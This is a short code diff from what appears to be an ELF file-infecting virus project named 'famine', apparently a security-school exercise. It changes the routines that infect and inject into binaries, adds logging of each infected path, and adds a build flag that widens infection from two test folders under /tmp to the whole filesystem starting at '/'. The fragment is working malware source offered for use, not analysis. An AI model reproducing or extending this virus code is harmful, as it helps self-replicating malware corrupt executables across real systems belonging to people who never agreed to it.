@@ -99,7 +99,9 @@ static void _infect(const char *path, void *ctx) {
 
 	_inject(&s, first_idx, interp_idx);
 
-	elf_manager_finalize(&s, path);
+	if (elf_manager_finalize(&s, path) != EXIT_FAILURE) {
+		verbose("infected path: %s\n", path);
+	}
 }
 
 void	famine(
@@ -112,8 +114,12 @@ void	famine(
 	_stub64_bin_start = stub64_start;
 	_stub64_bin_end = stub64_end;
 
+#ifdef INFECT_FULL_PATH
+	_list_recursive("/", _infect, nullptr);
+#else
 	_list_recursive("/tmp/test", _infect, nullptr);
 	_list_recursive("/tmp/test2", _infect, nullptr);
+#endif
 }
 
 // ---
